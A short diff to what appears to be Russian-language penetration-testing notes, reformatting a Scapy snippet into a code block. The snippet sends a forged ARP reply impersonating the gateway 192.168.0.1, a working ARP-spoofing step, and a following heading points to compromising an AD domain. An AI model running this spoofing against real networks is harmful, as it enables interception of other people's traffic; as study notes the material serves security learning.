@@ -6,8 +6,10 @@
 
 Необходимо отправить ответы, что якобы мы являемся тем-то тем-то и наш MAC адрес такой-то (Выдать себя за другого). В Этом поможет Scapy
 
-- from scapy.all import *
-- sendp(Ether(dst='92:94:88:A8:EE:94')/ARP(op='is-at', psrc='192.168.0.1', hwsrc='ea:f0:2f:00:11:3a'))
+```python
+from scapy.all import *
+sendp(Ether(dst='92:94:88:A8:EE:94')/ARP(op='is-at', psrc='192.168.0.1', hwsrc='ea:f0:2f:00:11:3a'))
+```
 
 ## 2) Компрометация домена AD
 
